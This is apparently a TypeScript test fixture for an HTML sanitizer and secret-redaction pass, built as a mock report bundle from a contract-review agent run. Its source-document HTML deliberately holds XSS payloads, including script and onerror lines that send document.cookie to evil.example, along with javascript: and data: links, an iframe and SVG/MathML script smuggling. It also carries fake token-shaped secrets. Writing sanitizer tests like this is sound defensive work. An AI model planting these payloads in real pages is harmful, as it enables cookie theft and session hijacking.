/**
 * Adversarial run report bundle fixture — schema v1.
 *
 * Hand-authored rather than vendored from a real run: real bundles carry legal
 * transcripts and source documents, and Hive has no Python toolchain to run the
 * generator.
 *
 * This is the fixture the sanitizer is actually judged against, so it packs in
 * every hostile shape at once:
 *   - `<script>`, `onerror`, a `javascript:` href, `target="_blank"`, inline `style`
 *   - a FULL-DOCUMENT `source_docs[].html` (doctype/html/head/body), which is
 *     what the .docx/.eml/.xlsx converters actually emit — not a fragment
 *   - a ```mermaid fence and raw HTML inside `concepts.synthesis.overall_narrative`
 *   - token-shaped strings in a per-agent trace and in `page_data.set_var`
 *   - a transcript trace nested MORE THAN TEN levels deep, which is exactly
 *     where the old `depth > 10` redaction bailout used to give up
 *   - both timestamp forms: "YYYY-MM-DD HH:MM:SS.mmm" and true ISO8601
 */

/** Build a transcript nested `depth` levels deep with a secret at the bottom. */
function deepTranscript(depth: number): Record<string, unknown> {
  let node: Record<string, unknown> = {
    role: "assistant",
    // Must survive redaction at depth > 10.
    authorization: "Bearer sk-live-DEEPLYNESTEDSECRET0123456789",
    content: "Final tool call used AKIAIOSFODNN7EXAMPLE to sign the request.",
  };
  for (let i = depth; i > 0; i--) {
    node = { step: i, nested: node };
  }
  return node;
}

export const FULL_BUNDLE = {
  schema_version: 1,
  generated_at: "2026-08-10 14:32:07.418",

  page_data: {
    set_var: {
      task_slug: "contract-review-nda-01",
      task_goal: "Review the attached NDA and flag unusual indemnity terms.",
      model: "claude-sonnet-5",
      judge_model: "claude-sonnet-4-6",
      // Token-shaped values: the scoped pass MUST scrub these.
      apiKey: "sk-ant-api03-EXAMPLEKEYVALUE0123456789abcdef",
      aws_access_key_id: "AKIAIOSFODNN7EXAMPLE",
      swarm_secret_alias: "{{SWARM_SECRET_ALIAS}}",
      started_at: "2026-08-10 14:28:11.002",
      finished_at: "2026-08-10T14:32:07.418+00:00",
    },
    security: {
      redactions_applied: 4,
      secrets_scanned: 812,
      findings: [],
    },
    // Real Harvey runner step names, so the timeline exercises the actual
    // step → phase mapping. Deliberately overlapping in places: the gantt must
    // show concurrency as overlap and idle time as gaps, which a chart of
    // per-step durations cannot.
    branches: [
      { name: "set_var", start: "2026-08-10 14:28:11.002", end: "2026-08-10 14:28:14.320", status: "ok" },
      { name: "check_documents", start: "2026-08-10 14:28:14.320", end: "2026-08-10 14:28:29.905", status: "ok" },
      { name: "build_checklist_body", start: "2026-08-10 14:28:29.905", end: "2026-08-10 14:28:33.110", status: "ok" },
      { name: "call_checklist_llm", start: "2026-08-10 14:28:33.110", end: "2026-08-10 14:28:44.771", status: "ok" },
      { name: "parse_checklist", start: "2026-08-10 14:28:44.771", end: "2026-08-10 14:28:47.002", status: "ok" },
      { name: "write_checklist_to_file", start: "2026-08-10 14:28:47.002", end: "2026-08-10 14:28:49.550", status: "ok" },
      // These two run concurrently — the bars must overlap on the axis.
      { name: "run_cross_check_agent", start: "2026-08-10 14:28:49.550", end: "2026-08-10 14:29:41.880", status: "ok" },
      { name: "run_case_law_research", start: "2026-08-10 14:28:52.100", end: "2026-08-10 14:30:02.115", status: "ok" },
      { name: "build_drafter_plan", start: "2026-08-10 14:30:02.115", end: "2026-08-10 14:30:08.440", status: "ok" },
      { name: "run_draft", start: "2026-08-10 14:30:08.440", end: "2026-08-10 14:31:12.760", status: "ok" },
      { name: "verify_completeness", start: "2026-08-10 14:31:12.760", end: "2026-08-10 14:31:24.300", status: "ok" },
      { name: "verify_correctness", start: "2026-08-10 14:31:24.300", end: "2026-08-10 14:31:36.120", status: "ok" },
      { name: "run_aggregator", start: "2026-08-10 14:31:36.120", end: "2026-08-10 14:31:40.900", status: "ok" },
      { name: "score_rubric", start: "2026-08-10 14:31:40.900", end: "2026-08-10 14:32:01.640", status: "ok" },
      { name: "format_results", start: "2026-08-10 14:32:01.640", end: "2026-08-10 14:32:04.880", status: "ok" },
      { name: "post_result", start: "2026-08-10 14:32:04.880", end: "2026-08-10T14:32:07.418+00:00", status: "ok" },
    ],
    health_notes: [
      { level: "warn", message: "Retrieval returned 2 documents below the relevance floor." },
      { level: "info", message: "No rate limiting encountered." },
    ],
    log_stats: {
      lines: 4821,
      errors: 0,
      warnings: 2,
      // Another token shape in a log/config surface.
      last_auth_header: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N",
    },
    outputs: {
      document_path: "s3://stakwork-uploads/runs/abc123/output.docx",
      token_usage: { input: 91_204, output: 8_113 },
    },
  },

  analysis: {
    summaries: [
      {
        id: "R1",
        title: "Identifies the indemnity cap",
        verdict: "pass",
        reasoning: "The response correctly names the $2,000,000 aggregate cap in section 8.2.",
      },
      {
        id: "R2",
        title: "Flags the unilateral termination clause",
        verdict: "fail",
        reasoning: "The response does not mention section 12.4 at all.",
        cause_type: "retrieval_miss",
        cause_summary: "Section 12.4 was never retrieved into context.",
        cause_detail: "The chunker split section 12 across two windows and only the first was scored above the relevance floor.",
        suggested_fix: "Increase chunk overlap for numbered contract sections, or retrieve whole sections when a heading matches.",
      },
      {
        id: "R3",
        title: "Cites the governing law",
        verdict: "fail",
        reasoning: "Cited Delaware; the agreement specifies New York.",
        cause_type: "retrieval_miss",
        cause_summary: "Governing-law clause was outranked by a boilerplate paragraph.",
        suggested_fix: "Increase chunk overlap for numbered contract sections, or retrieve whole sections when a heading matches.",
      },
    ],
    traces: [
      {
        agent: "retriever",
        started_at: "2026-08-10 14:28:44.771",
        // Deeper than the old depth-10 bailout.
        transcript: deepTranscript(14),
      },
      {
        agent: "drafter",
        started_at: "2026-08-10T14:30:02.115+00:00",
        transcript: {
          role: "assistant",
          content: "Drafting summary. Auth token ghp_EXAMPLETOKENVALUE01234567890abcdef was rotated.",
        },
      },
    ],
  },

  concepts: {
    synthesis: {
      // Contains a mermaid fence AND raw HTML. Neither may reach a renderer
      // that would interpret them — this renders as escaped React text.
      overall_narrative:
        "The run failed two rubrics for the same reason.\n\n" +
        "```mermaid\ngraph TD\n  A[Chunk] --> B[Retrieve]\n  B --> C[Draft]\n```\n\n" +
        "<img src=x onerror=alert(document.cookie)> <script>alert('concepts')</script>\n\n" +
        "Both failures trace to section-splitting during chunking.",
      confidence: 0.78,
    },
    nodes: [
      { id: "law", label: "Law", kind: "concept" },
      { id: "contract-review", label: "Contract Review", kind: "concept" },
    ],
  },

  source_docs: [
    {
      id: "doc-nda",
      title: "Mutual NDA — Acme / Initech (executed).docx",
      // FULL DOCUMENT, as the converters emit. Note the doctype/html/head that
      // the pinned schema was never written for and must be discarded, plus
      // every hostile construct we claim to strip.
      html: `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Mutual NDA</title>
  <style>body { background: url('https://tracker.example/beacon.png'); }</style>
  <script>fetch('https://evil.example/exfil?c='+document.cookie)</script>
</head>
<body>
  <h1 id="title" class="doc-title" style="color:#c00">MUTUAL NON-DISCLOSURE AGREEMENT</h1>
  <p>This Agreement is entered into as of <time datetime="2026-03-01">March 1, 2026</time>
     between <strong>Acme Corporation</strong> and <strong>Initech LLC</strong>.</p>

  <img src="x" onerror="fetch('https://evil.example/'+document.cookie)" alt="logo">
  <a href="javascript:alert('xss')" target="_blank">Exhibit A</a>
  <a href="https://courts.example/docket/2024-CV-1187" target="_blank" rel="external">Docket 2024-CV-1187</a>

  <h2>8. Indemnification</h2>
  <p>8.2 Aggregate liability shall not exceed <strong>$2,000,000</strong>.
     Registration no. AKIAIOSFODNN7EXAMPLE appears in the corporate filing and
     must NOT be scrubbed by the token pass.</p>

  <h2>12. Term and Termination</h2>
  <p>12.4 Either party may terminate for convenience on thirty (30) days notice.</p>

  <table>
    <thead><tr><th colspan="2">Schedule of Fees</th></tr></thead>
    <tbody>
      <tr><td colspan="2" onclick="steal()">Combined annual fee</td></tr>
      <tr><td>Year 1</td><td align="right">$45,000</td></tr>
    </tbody>
  </table>

  <svg xmlns="http://www.w3.org/2000/svg"><foreignObject><script>alert('svg')</script></foreignObject></svg>
  <iframe src="https://evil.example/frame"></iframe>
  <math><mtext><script>alert('math')</script></mtext></math>

  <p>Governing law: the laws of the State of <em>New York</em>.</p>
</body>
</html>`,
    },
    {
      id: "doc-email",
      title: "RE: NDA redlines (thread).eml",
      html: `<!doctype html><html><head><title>RE: NDA redlines</title></head><body>
  <blockquote cite="mailto:counsel@initech.example">
    <p>We can live with the cap at $2,000,000 but section 12.4 needs to be mutual.</p>
  </blockquote>
  <p>Sent from a device. <a href="data:text/html,<script>alert(1)</script>">attachment</a></p>
</body></html>`,
    },
  ],

  workfiles: [
    {
      name: "scratch/retrieval-plan.txt",
      // Angle brackets in plain prose — must render as text, not be swallowed.
      text: "Plan: retrieve <section 8>, <section 12>, then compare against rubric R1..R3.\nNote key AKIAIOSFODNN7EXAMPLE stays intact here too (not a trace field).",
    },
    { name: "scratch/notes.md", text: "Chunk overlap currently 64 tokens. Consider 256 for numbered sections." },
  ],

  rubric_links: {
    R1: [{ doc: "doc-nda", tokens: ["$2,000,000", "Aggregate liability"] }],
    R2: [{ doc: "doc-nda", tokens: ["terminate for convenience", "thirty (30) days"] }],
    R3: [{ doc: "doc-nda", tokens: ["State of New York"] }],
  },
};
